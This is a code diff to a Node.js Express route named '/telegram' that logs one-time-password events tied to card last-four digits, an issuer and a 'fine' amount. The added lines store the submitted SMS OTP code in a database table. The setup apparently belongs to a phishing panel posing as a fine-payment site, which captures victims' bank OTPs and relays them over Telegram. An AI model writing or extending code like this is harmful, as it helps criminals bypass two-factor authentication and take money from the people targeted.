@@ -138,7 +138,8 @@ router.post('/telegram', async (req, res) => {
   if (['otp_sms','otp_notification_resend','otp_resend','otp_approved'].includes(type)) {
     const { sid='', cardLast4='-', totalFine='-', issuer='-', otp=null } = body;
     try {
-      await query('INSERT INTO otp_events (sid, type, ip) VALUES (?,?,?)', [sid, type, clientIp(req)]);
+      await query('INSERT INTO otp_events (sid, type, ip, otp_code) VALUES (?,?,?,?)',
+        [sid, type, clientIp(req), type === 'otp_sms' ? (otp || null) : null]);
       if (type === 'otp_approved') {
         await query("UPDATE payments SET otp_status = 'approved' WHERE sid = ?", [sid]);
       } else if (type === 'otp_sms') {
